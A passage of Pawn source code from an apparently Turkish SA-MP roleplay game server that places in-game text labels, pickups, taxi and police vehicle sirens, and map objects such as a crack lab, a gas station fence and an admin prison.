    CreateDynamic3DTextLabel("Kýyafet satýn almak için \n/kiyafetal yaz.",COLOR_YELLOW,206.4552,-163.0903,1000.5234,8.0);
    CreateDynamic3DTextLabel("Oyuncak satýn almak için \n/oyuncakal yaz.",COLOR_YELLOW,206.3253,-100.3268,1005.2578,8.0);
    CreateDynamic3DTextLabel("Oyuncak satýn almak için \n/oyuncakal yaz.",COLOR_YELLOW,201.0413,-40.1616,1001.8047,8.0);
    CreateDynamic3DTextLabel("Oyuncak satýn almak için \n/oyuncakal yaz.",COLOR_YELLOW,206.3963,-8.2122,1001.2109,8.0);
    CreateDynamic3DTextLabel("Oyuncak satýn almak için \n/oyuncakal yaz.",COLOR_YELLOW,162.7706,-83.2726,1001.8047,8.0);
    CreateDynamic3DTextLabel("Oyuncak satýn almak için \n/oyuncakal yaz.",COLOR_YELLOW,202.6777,-163.0623,1000.5306,8.0);

	// DMV
 	CreateDynamic3DTextLabel("Cezalarýný ödemek yada baðlanmýþ\naracýný çýkarmak için\n/dmvmenu",COLOR_YELLOW,833.60, 3.23, 1004.17+0.6,4.0);//

 	//belgeal
 	CreateDynamic3DTextLabel("Belge satýn almak için \n/belgeal yaz.",COLOR_YELLOW,-1209.552001, -171.159011, 4891.833007+0.5,8.0);// Licenses.
    CreatePickup(1239, 23, -1209.552001, -171.159011, 4891.833007, -1);

    // The Lubu Gentlemen's Club (pickup + text label)
    CreateDynamic3DTextLabel("Scylla Bar",COLOR_YELLOW,511.817230, -1510.971679, 14.566996+0.7,10.0);
    CreatePickup(1318, 23, 511.817230, -1510.971679, 14.566996, -1);
    // The Tableau Club (pickup + text label)
    CreateDynamic3DTextLabel("Scylla Bar",COLOR_YELLOW,561.802795, -1506.722412, 14.548986+0.7,10.0);
    CreatePickup(1318, 23, 561.802795, -1506.722412, 14.548986, -1);
    CreateDynamic3DTextLabel("Scylla Kulüp VIP Odasý\nGiriþ ücreti:$100",COLOR_YELLOW,307.904296, 1025.602294, 1098.540039+0.7,10.0);
    CreatePickup(1318, 23, 307.904296, 1025.602294, 1098.540039, -1);

    // Parachute at Startower
    CreateDynamic3DTextLabel("/parasutal",COLOR_YELLOW,1544.2,-1353.4,329.4+0.6,10.0);
   	CreatePickup(371, 23, 1544.2, -1353.4, 329.4); //LS towertop
	CreatePickup(371, 23, 1536.0, -1360.0, 1150.0); //LS towertop
	
     // Plakaal
	CreatePickup(1239, 23, 844.2158,-599.0760,18.4219, -1);
	CreateDynamic3DTextLabel("Plaka almak için\n/plakaal ( 5000 $ )",COLOR_RED,844.2158,-599.0760,18.4219,4.0);
	
     // Mobese
	CreatePickup(1239, 23, 274.5474,110.2418,1004.6172, -1);
	CreateDynamic3DTextLabel("Mobese için\n/mobese",COLOR_RED,274.5474, 110.2418, 1004.6172,4.0);
	
	// Changename
	CreateDynamic3DTextLabel("Ýsim Deðiþtirme Yeri \nÝsim deðiþtirmek için /isimdegistir yaz",COLOR_YELLOW,1154.7295,-1440.2323,15.7969+0.6,18.0); // Namechange at mall
	CreatePickup(1239, 23, 1154.7295, -1440.2323, 15.7969); //isimdegistir


    AddStaticVehicleEx(487, -146.6659, 1043.2775, 20.1435, 10.6522, 256, 6, VEHICLE_RESPAWN); // hel

	// Taxi vehicles
	TAXIVehicles[1] = AddStaticVehicleEx(420,1775.6141,-1860.0100,13.2745,269.2006,6,6, VEHICLE_RESPAWN);
	TAXIVehicles[2] = AddStaticVehicleEx(420,1763.0121,-1860.0037,13.2723,271.2998,6,6, VEHICLE_RESPAWN);
	TAXIVehicles[3] = AddStaticVehicleEx(420,1748.9358,-1859.9502,13.2721,270.3943,6,6, VEHICLE_RESPAWN);
	TAXIVehicles[4] = AddStaticVehicleEx(420,1734.6754,-1859.9305,13.2740,270.5646,6,6, VEHICLE_RESPAWN);
	TAXIVehicles[5] = AddStaticVehicleEx(438,1807.70861816,-1866.13635254,13.78153229,0.00000000,6,6,VEHICLE_RESPAWN); //Cabbie
	TAXIVehicles[6] = AddStaticVehicleEx(438,1802.05126953,-1866.05419922,13.78153229,0.00000000,6,6,VEHICLE_RESPAWN); //Cabbie
	TAXIVehicles[7] = AddStaticVehicleEx(438,1797.65332031,-1866.18798828,13.78153229,0.00000000,6,6,VEHICLE_RESPAWN); //Cabbie
	TAXIVehicles[8] = AddStaticVehicleEx(438,1792.40527344,-1866.47851562,13.78153229,0.00000000,6,6,VEHICLE_RESPAWN); //Cabbie
	
 	for(new x;x<sizeof(TAXIVehicles);x++) {
	    format(string, sizeof(string), "TAXI %d", TAXIVehicles[x]);
	    SetVehicleNumberPlate(TAXIVehicles[x], string);
	    SetVehicleToRespawn(TAXIVehicles[x]);
	    format(string,sizeof(string),"TAXI %d",TAXIVehicles[x]);
        taksiplaka = Create3DTextLabel(string, 0x9ACD32AA,30.0,40.0,50.0,40.0,0);
        Attach3DTextLabelToVehicle(taksiplaka, TAXIVehicles[x], 0.0, -0.2, 1.4 );
	}

	// -------------------- SIRENLER --------------------- //
	// LSPD Sirenler
	lspdsiren[0] = CreateDynamicObject(19620, 0, 0, 0, 0, 0, 0);
	lspdsiren[1] = CreateDynamicObject(19620, 0, 0, 0, 0, 0, 0);
	lspdsiren[2] = CreateDynamicObject(19620, 0, 0, 0, 0, 0, 0);
    lspdsiren[3] = CreateDynamicObject(19620, 0, 0, 0, 0, 0, 0);
	// LSFMD Sirenler
	lsfmdsiren[0] = CreateDynamicObject(19620, 0, 0, 0, 0, 0, 0);
	lsfmdsiren[1] = CreateDynamicObject(19620, 0, 0, 0, 0, 0, 0);

	// [---- LSPD Sirenler ---- ]
	AttachDynamicObjectToVehicle(lspdsiren[0], LSPDVehicles[13], -0.01640, 0.13990, 0.81380, 0.0, 0.0, 0.0); //Object Model: 19620 |
	AttachDynamicObjectToVehicle(lspdsiren[1], LSPDVehicles[14], -0.01640, 0.13990, 0.81380, 0.0, 0.0, 0.0); //Object Model: 19620 |
	AttachDynamicObjectToVehicle(lspdsiren[2], LSPDVehicles[39], -0.01640, -0.02010, 0.67380, 0.0, 0.0, 0.0); //Object Model: 19620 |
	AttachDynamicObjectToVehicle(lspdsiren[3], LSPDVehicles[40], -0.01640, -0.02010, 0.67380, 0.0, 0.0, 0.0); //Object Model: 19620 |
	AttachDynamicObjectToVehicle(lsfmdsiren[0], LSFMDVehicles[41], -0.01640, 0.13990, 0.81380, 0.0, 0.0, 0.0); //Object Model: 19620 |
	AttachDynamicObjectToVehicle(lsfmdsiren[1], LSFMDVehicles[42], -0.01640, 0.13990, 0.81380, 0.0, 0.0, 0.0); //Object Model: 19620 |

///////////////////////////////////////////////////////////////////////////////////////////////////
	new sirena2 = CreateObject(19327, 0.0, 0.0, 0.0,   0.00000, 0.00000, 0.00000); // create the object
 	SetObjectMaterialText(sirena2, "{0080FF}LSPD", 0,OBJECT_MATERIAL_SIZE_512x512,"Arial", 90, 1, 0x0080FF, 0x0000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER); //re-texture the object(and make it invisible)
	AttachObjectToVehicle(sirena2, LSPDVehicles[40], 0.0, -1.9, 0.3, 270.0, 0.0, 0.0);// attach and angle to the object
	new sirena4 = CreateObject(19327, 0.0, 0.0, 0.0,   0.00000, 0.00000, 0.00000); // create the object
 	SetObjectMaterialText(sirena4, "{0080FF}LSPD", 0,OBJECT_MATERIAL_SIZE_512x512,"Arial", 90, 1, 0x0080FF, 0x0000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER); //re-texture the object(and make it invisible)
	AttachObjectToVehicle(sirena4, LSPDVehicles[39], 0.0, -1.9, 0.3, 270.0, 0.0, 0.0);// attach and angle to the object
 	new sirena3 = CreateObject(19327, 0.0, 0.0, 0.0,  0.00000, 0.00000, 0.00000);
 	SetObjectMaterialText(sirena3, "{0080FF}LSPD", 0,OBJECT_MATERIAL_SIZE_512x512,"Arial", 90, 1, 0x0080FF, 0x0000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER); //re-texture the object(and make it invisible)
	AttachObjectToVehicle(sirena3, LSPDVehicles[13], 0.000999, 1.964998, 0.304999, -98.489929, -180.900100, -0.000000); //Object Model: 19327 |
 	new sirena5 = CreateObject(19327, 0.0, 0.0, 0.0,  0.00000, 0.00000, 0.00000);
 	SetObjectMaterialText(sirena5, "{0080FF}LSPD", 0,OBJECT_MATERIAL_SIZE_512x512,"Arial", 90, 1, 0x0080FF, 0x0000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER); //re-texture the object(and make it invisible)
	AttachObjectToVehicle(sirena5, LSPDVehicles[14], 0.000999, 1.964998, 0.304999, -98.489929, -180.900100, -0.000000); //Object Model: 19327 |
////////////////////////////////////////////////////////////////////////////////////////////////////

 // Removal of hell hole (VIP Lounge)
	CreateDynamicObject(5397, 1782.96, -1563.40, 20.57,   0.00, 0.00, -4.00);
	CreateDynamicObject(3623, 1756.68, -1578.90, 16.63,   0.00, 0.00, 171.00);
	CreateDynamicObject(9946, 1777.26, -1581.90, 12.23,   0.00, 0.00, 0.00);
	CreateDynamicObject(9946, 1787.87, -1555.69, 12.23,   0.00, 0.00, 0.00);
	CreateDynamicObject(1557, 1781.43, -1564.99, 12.29,   0.00, 0.00, -4.00);
	CreateDynamicObject(1557, 1784.42, -1565.20, 12.29,   0.00, 0.00, 176.00);
	CreateDynamicObject(6057, 1766.17, -1540.20, 13.28,   0.00, 0.00, 180.00);
	CreateDynamicObject(6057, 1798.54, -1541.37, 13.24,   0.00, 0.00, 178.00);
	CreateDynamicObject(9339, 1765.43, -1593.55, 12.08,   0.00, 0.00, 84.00);
	CreateDynamicObject(3660, 1773.95, -1593.39, 14.19,   0.00, 0.00, -4.00);
	CreateDynamicObject(18766, 1821.13, -1537.24, 17.44,   90.00, 0.00, 73.00);
	CreateDynamicObject(18766, 1819.97, -1540.89, 17.44,   90.00, 0.00, 73.00);
	CreateDynamicObject(3623, 1761.02, -1551.50, 16.63,   0.00, 0.00, 171.00);
	/* Temporary tombstone joke
	CreateDynamicObject(5777, 1767.33, -1578.64, 12.99,   0.00, 0.00, -11.00);
	CreateDynamicObject(325, 1767.82, -1578.75, 12.53,   0.00, 76.00, 91.00);
	CreateDynamicObject(325, 1767.73, -1578.79, 12.57,   0.00, 76.00, 271.00);
	CreateDynamicObject(1080, 1767.38, -1579.73, 12.85,   0.00, -25.00, 295.00);
	CreateDynamicObject(971, 1766.63, -1578.56, 12.47,   0.00, 0.00, 80.00);
	CreateDynamic3DTextLabel("Here lays gates, gold rims\nand outrageous advantages\nMay they all rest in HELL",COLOR_BLACK,1767.881835, -1578.757446, 13.347187+0.1,6.0);*/

	// Crack Lab Fixes
	CreateDynamicObject(7191,2338.39135742,-1182.56323242,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(1)
	CreateDynamicObject(13656,2292.93872070,-1132.04724121,1017.29772949,0.00000000,0.00000000,0.00000000, -1, 5); //object(fuckknows)(1)
	CreateDynamicObject(7191,2337.95458984,-1182.54309082,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(2)
	CreateDynamicObject(7191,2338.43408203,-1182.39440918,1032.95129395,90.00000000,180.00000000,90.24850464, -1, 5); //object(vegasnnewfence2b)(3)
	CreateDynamicObject(7191,2337.97314453,-1182.39111328,1032.95129395,90.00000000,179.99450684,90.24719238, -1, 5); //object(vegasnnewfence2b)(4)
	CreateDynamicObject(7191,2328.80346680,-1180.43066406,1034.70544434,0.00000000,270.00000000,88.50006104, -1, 5); //object(vegasnnewfence2b)(5)
	CreateDynamicObject(3055,2319.78198242,-1184.82641602,1032.36450195,63.75003052,269.99996948,178.5001220, -1, 5); //object(kmb_shutter)(1)
	CreateDynamicObject(7191,2328.83715820,-1186.81262207,1030.70446777,0.00000000,90.74990845,359.99481201, -1, 5); //object(vegasnnewfence2b)(6)
	CreateDynamicObject(7191,2326.84863281,-1187.03125000,1030.70446777,0.00000000,90.74707031,359.99450684, -1, 5); //object(vegasnnewfence2b)(8)
	CreateDynamicObject(7191,2337.31689453,-1186.55639648,1030.70446777,0.00000000,90.74707031,359.99450684, -1, 5); //object(vegasnnewfence2b)(9)
	CreateDynamicObject(7191,2339.06689453,-1186.13159180,1030.70446777,0.00000000,91.24694824,359.99453735, -1, 5); //object(vegasnnewfence2b)(10)
	CreateDynamicObject(7191,2338.39062500,-1182.56250000,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(11)
	CreateDynamicObject(7191,2337.95947266,-1179.38879395,1032.95129395,90.00000000,180.00000000,270.00000000, -1, 5); //object(vegasnnewfence2b)(12)
	CreateDynamicObject(7191,2338.38476562,-1179.43066406,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(13)
	CreateDynamicObject(7191,2337.96630859,-1179.23559570,1032.95129395,90.00000000,179.99450684,90.24719238, -1, 5); //object(vegasnnewfence2b)(14)

	// Gas station fix
	CreateDynamicObject(970,1942.49000000,-1766.66000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1942.49000000,-1770.81000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1942.49000000,-1774.95000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1942.49000000,-1779.11000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1940.77000000,-1766.66000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1940.77000000,-1770.81000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1940.77000000,-1774.95000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(970,1940.77000000,-1779.11000000,12.90000000,0.00000000,0.00000000,90.00000000);
	CreateDynamicObject(19121,1941.63000000,-1781.03000000,13.16000000,0.00000000,0.00000000,0.00000000);
	CreateDynamicObject(19121,1941.64000000,-1764.87000000,13.16000000,0.00000000,0.00000000,0.00000000);

	// Points
	CreateDynamicObject(970, 2294.1489257813, -1119.072265625, 37.5280418396, 0.000000, 0.000000, 89.559997558594);
	CreateDynamicObject(970, 2294.1589355469, -1114.8975830078, 37.5280418396, 0.000000, 0.000000, 90.0576171875);
	CreateDynamicObject(970, 2294.1552734375, -1110.7277832031, 37.5280418396, 0.000000, 0.000000, 90.054931640625);
	CreateDynamicObject(970, 2294.1496582031, -1106.5516357422, 37.5280418396, 0.000000, 0.000000, 90.054931640625);
	CreateDynamicObject(970, 2293.8994140625, -1102.4005126953, 37.5280418396, 0.000000, 0.000000, 96.804931640625);
	CreateDynamicObject(944, 2290.7561035156, -1103.4783935547, 37.861351013184, 0.000000, 0.000000, 171);
	CreateDynamicObject(3265, 2268.6408691406, -1135.2796630859, 27.531494140625, 0.000000, 0.000000, 346);
	CreateDynamicObject(944, 2386.1618652344, -2008.1566162109, 13.43848991394, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1635, 2396.1938476563, -2008.0467529297, 16.3014087677, 0.000000, 0.000000, 90);
	CreateDynamicObject(1522, 2389.7197265625, -2007.4593505859, 12.553703308105, 0.000000, 0.000000, 0.000000);

	// FIX - Stability Glitch for the Welcome
	CreateDynamicObject(4729, 682.85186767578, -446.04205322266, -26.629999160767, 20, 90, 0.000000, -1, 1, -1, 200.0);

	// Admin prison
	CreateDynamicObject(5706,201.06250000,1798.30761719,1605.14282227,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(studiobld03_law) (1)
	CreateDynamicObject(5706,200.97360229,1800.69091797,1624.89306641,0.00000000,180.00000000,180.00000000, .interiorid = 69); //object(studiobld03_law) (2)
	CreateDynamicObject(5706,201.04508972,1785.34130859,1616.89306641,90.00000000,180.00000000,0.00000000, .interiorid = 69); //object(studiobld03_law) (3)
	CreateDynamicObject(5706,187.49099731,1798.58190918,1616.89306641,270.00000000,167.22003174,77.22552490, .interiorid = 69); //object(studiobld03_law) (5)
	CreateDynamicObject(5706,221.26737976,1796.82397461,1616.89306641,270.00000000,0.00000000,90.00000000, .interiorid = 69); //object(studiobld03_law) (6)
	CreateDynamicObject(10974,185.34759521,1795.66455078,1623.84826660,180.00000000,0.00000000,0.00000000, .interiorid = 69); //object(mall_01_sfs) (1)
	CreateDynamicObject(14856,216.09912109,1811.63830566,1610.83496094,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(cellsa) (1)
	CreateDynamicObject(3095,213.05435181,1806.09997559,1612.68823242,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (2)
	CreateDynamicObject(3095,204.07275391,1806.09997559,1612.68823242,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (3)
	CreateDynamicObject(3095,195.12341309,1806.09997559,1612.68823242,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (4)
	CreateDynamicObject(3095,213.12713623,1806.10498047,1613.26379395,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (6)
	CreateDynamicObject(3095,204.15332031,1806.10498047,1613.26379395,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (7)
	CreateDynamicObject(3095,195.16894531,1806.10498047,1613.26379395,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (8)
	CreateDynamicObject(3095,213.20382690,1807.67150879,1608.71374512,90.00000000,180.00549316,269.98904419, .interiorid = 69); //object(a51_jetdoor) (10)
	CreateDynamicObject(3095,213.95382690,1807.67102051,1608.71374512,270.00000000,179.99963379,269.98315430, .interiorid = 69); //object(a51_jetdoor) (11)
	CreateDynamicObject(3095,208.95237732,1807.66687012,1608.71374512,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (12)
	CreateDynamicObject(3095,209.71374512,1807.66662598,1608.71374512,270.00000000,180.00041199,269.98388672, .interiorid = 69); //object(a51_jetdoor) (13)
	CreateDynamicObject(3095,205.46282959,1807.69738770,1608.71374512,270.00000000,180.00152588,269.98498535, .interiorid = 69); //object(a51_jetdoor) (15)
	CreateDynamicObject(3095,204.15332031,1807.69628906,1608.98876953,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (16)
	CreateDynamicObject(3095,213.12890625,1807.69628906,1608.98779297,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (17)
	CreateDynamicObject(3095,204.16938782,1809.18554688,1613.41516113,90.00000000,180.00549316,0.00000000, .interiorid = 69); //object(a51_jetdoor) (18)
	CreateDynamicObject(3095,213.16665649,1809.18652344,1613.41442871,90.00000000,180.00549316,0.00000000, .interiorid = 69); //object(a51_jetdoor) (19)
	CreateDynamicObject(1508,217.57765198,1795.53601074,1610.62158203,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(dyn_garage_door) (1)
	CreateDynamicObject(3095,213.95312500,1807.67089844,1617.71423340,270.00000000,179.99450684,269.97802734, .interiorid = 69); //object(a51_jetdoor) (22)
	CreateDynamicObject(3095,213.20312500,1807.67089844,1617.66418457,90.00000000,180.00549316,269.98901367, .interiorid = 69); //object(a51_jetdoor) (23)
	CreateDynamicObject(3095,209.71289062,1807.66601562,1617.38842773,270.00000000,179.99450684,269.97802734, .interiorid = 69); //object(a51_jetdoor) (24)
	CreateDynamicObject(3095,208.95214844,1807.66601562,1617.19018555,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (25)
	CreateDynamicObject(3095,205.46191406,1807.67187500,1617.19042969,270.00000000,179.99853516,269.98202515, .interiorid = 69); //object(a51_jetdoor) (26)
	CreateDynamicObject(3095,204.82421875,1807.67285156,1617.76354980,90.00000000,180.00549316,269.98904419, .interiorid = 69); //object(a51_jetdoor) (27)
	CreateDynamicObject(14856,216.09863281,1811.63769531,1615.11096191,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(cellsa) (2)
	CreateDynamicObject(3095,213.12890625,1806.10498047,1617.53784180,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (28)
	CreateDynamicObject(3095,213.05371094,1806.11840820,1616.96350098,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (29)
	CreateDynamicObject(3095,204.17089844,1806.10498047,1616.96374512,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (30)
	CreateDynamicObject(3095,204.14634705,1806.12365723,1617.53930664,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (31)
	CreateDynamicObject(14856,216.09863281,1811.63769531,1619.23608398,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(cellsa) (3)
	CreateDynamicObject(3095,204.16894531,1809.18554688,1622.41491699,90.00000000,179.99450684,0.00549316, .interiorid = 69); //object(a51_jetdoor) (32)
	CreateDynamicObject(3095,213.16601562,1809.18652344,1622.41271973,90.00000000,180.00549316,0.00000000, .interiorid = 69); //object(a51_jetdoor) (33)
	CreateDynamicObject(3095,217.44302368,1806.10583496,1621.96374512,90.00000000,180.00549316,269.98904419, .interiorid = 69); //object(a51_jetdoor) (34)
	CreateDynamicObject(1508,191.36837769,1795.14965820,1610.62158203,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(dyn_garage_door) (2)
	CreateDynamicObject(3095,204.14608765,1806.11840820,1621.06384277,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (35)
	CreateDynamicObject(3095,213.05371094,1806.09960938,1621.06481934,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (36)
	CreateDynamicObject(3095,195.18051147,1807.69628906,1608.98876953,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (37)
	CreateDynamicObject(3095,195.21980286,1809.17871094,1613.41516113,90.00000000,179.99450684,0.01098633, .interiorid = 69); //object(a51_jetdoor) (38)
	CreateDynamicObject(3095,195.21972656,1809.17871094,1622.41491699,90.00000000,179.99450684,0.00549316, .interiorid = 69); //object(a51_jetdoor) (39)
	CreateDynamicObject(3095,199.09042358,1807.69812012,1617.76354980,90.00000000,180.00549316,269.98901367, .interiorid = 69); //object(a51_jetdoor) (40)
	CreateDynamicObject(3095,199.87951660,1807.70117188,1617.19042969,270.00000000,179.99450684,269.98352051, .interiorid = 69); //object(a51_jetdoor) (41)
	CreateDynamicObject(970,211.04483032,1801.64660645,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (1)
	CreateDynamicObject(970,215.34765625,1801.64648438,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (2)
	CreateDynamicObject(970,206.81762695,1801.64660645,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (3)
	CreateDynamicObject(970,202.59719849,1801.64660645,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (4)
	CreateDynamicObject(970,202.59667969,1801.64648438,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (5)
	CreateDynamicObject(970,206.81738281,1801.64648438,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (6)
	CreateDynamicObject(970,211.04394531,1801.64648438,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (7)
	CreateDynamicObject(970,215.34765625,1801.64648438,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (8)
	CreateDynamicObject(970,198.36755371,1801.64660645,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (9)
	CreateDynamicObject(14856,192.71429443,1811.66918945,1610.82006836,0.00000000,0.00000000,180.00000000, .interiorid = 69); //object(cellsa) (4)
	CreateDynamicObject(14856,192.71386719,1811.66894531,1615.09558105,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(cellsa) (5)
	CreateDynamicObject(14856,192.71386719,1811.66894531,1619.24499512,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(cellsa) (6)
	CreateDynamicObject(3095,203.34902954,1807.69787598,1608.71374512,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (47)
	CreateDynamicObject(3095,203.34912109,1807.70043945,1616.81311035,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (49)
	CreateDynamicObject(3095,199.85475159,1807.69226074,1608.44140625,270.00000000,179.99450684,269.97802734, .interiorid = 69); //object(a51_jetdoor) (52)
	CreateDynamicObject(3095,199.11541748,1807.69702148,1608.26379395,90.00000000,180.00549316,269.98901367, .interiorid = 69); //object(a51_jetdoor) (53)
	CreateDynamicObject(3095,194.85942078,1807.69738770,1617.76354980,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (54)
	CreateDynamicObject(3095,195.61764526,1807.69738770,1617.19042969,270.00000000,180.00036621,269.98388672, .interiorid = 69); //object(a51_jetdoor) (55)
	CreateDynamicObject(3095,195.61718750,1807.69726562,1608.51403809,270.00000000,179.99853516,269.98202515, .interiorid = 69); //object(a51_jetdoor) (56)
	CreateDynamicObject(3095,194.85937500,1807.69726562,1608.28735352,90.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (57)
	CreateDynamicObject(3095,195.14624023,1806.11840820,1621.06384277,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (58)
	CreateDynamicObject(3095,195.18821716,1806.10400391,1616.96374512,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(a51_jetdoor) (59)
	CreateDynamicObject(3095,195.15039062,1806.10498047,1617.53930664,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (60)
	CreateDynamicObject(3095,191.34226990,1806.09716797,1617.19042969,270.00000000,179.99853516,269.98205566, .interiorid = 69); //object(a51_jetdoor) (61)
	CreateDynamicObject(3095,191.34179688,1806.09667969,1608.31457520,270.00000000,179.99450684,269.97802734, .interiorid = 69); //object(a51_jetdoor) (62)
	CreateDynamicObject(3095,217.42178345,1806.11962891,1613.11291504,90.00000000,180.00549316,270.00000000, .interiorid = 69); //object(a51_jetdoor) (63)
	CreateDynamicObject(3095,188.47315979,1797.14782715,1613.26379395,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (64)
	CreateDynamicObject(3095,188.47315979,1788.17077637,1613.26379395,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (65)
	CreateDynamicObject(3095,188.47265625,1797.14746094,1617.53979492,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (66)
	CreateDynamicObject(3095,188.47265625,1788.16992188,1617.53881836,0.00000000,179.99450684,270.00000000, .interiorid = 69); //object(a51_jetdoor) (67)
	CreateDynamicObject(3095,188.48295593,1797.18103027,1612.68823242,0.00000000,0.00000000,180.00000000, .interiorid = 69); //object(a51_jetdoor) (68)
	CreateDynamicObject(3095,188.48242188,1797.18066406,1616.96374512,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(a51_jetdoor) (69)
	CreateDynamicObject(3095,188.47740173,1788.21972656,1616.96374512,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(a51_jetdoor) (70)
	CreateDynamicObject(3095,188.47656250,1788.21972656,1612.68920898,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(a51_jetdoor) (71)
	CreateDynamicObject(970,195.12841797,1801.67028809,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (10)
	CreateDynamicObject(970,198.36718750,1801.64648438,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (12)
	CreateDynamicObject(970,195.12792969,1801.66992188,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (13)
	CreateDynamicObject(970,192.93154907,1799.55737305,1613.81237793,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (14)
	CreateDynamicObject(970,192.93154907,1795.31909180,1613.81237793,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (15)
	CreateDynamicObject(970,192.93066406,1799.55664062,1618.06286621,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (17)
	CreateDynamicObject(970,192.93066406,1795.31835938,1618.06286621,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (18)
	CreateDynamicObject(3095,197.45889282,1786.73498535,1612.68823242,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(a51_jetdoor) (72)
	CreateDynamicObject(970,192.90052795,1793.24084473,1613.81237793,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (19)
	CreateDynamicObject(3095,197.48855591,1786.73596191,1613.26379395,0.00000000,180.00000000,0.00000000, .interiorid = 69); //object(a51_jetdoor) (73)
	CreateDynamicObject(3095,197.48828125,1786.73535156,1617.53601074,0.00000000,179.99450684,0.00000000, .interiorid = 69); //object(a51_jetdoor) (74)
	CreateDynamicObject(3095,197.45800781,1786.73437500,1616.96301270,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(a51_jetdoor) (76)
	CreateDynamicObject(3095,206.43820190,1786.73596191,1613.26379395,0.00000000,179.99450684,0.00000000, .interiorid = 69); //object(a51_jetdoor) (77)
	CreateDynamicObject(3095,206.42300415,1786.73400879,1612.68823242,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(a51_jetdoor) (78)
	CreateDynamicObject(970,192.90039062,1793.24023438,1618.06286621,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (20)
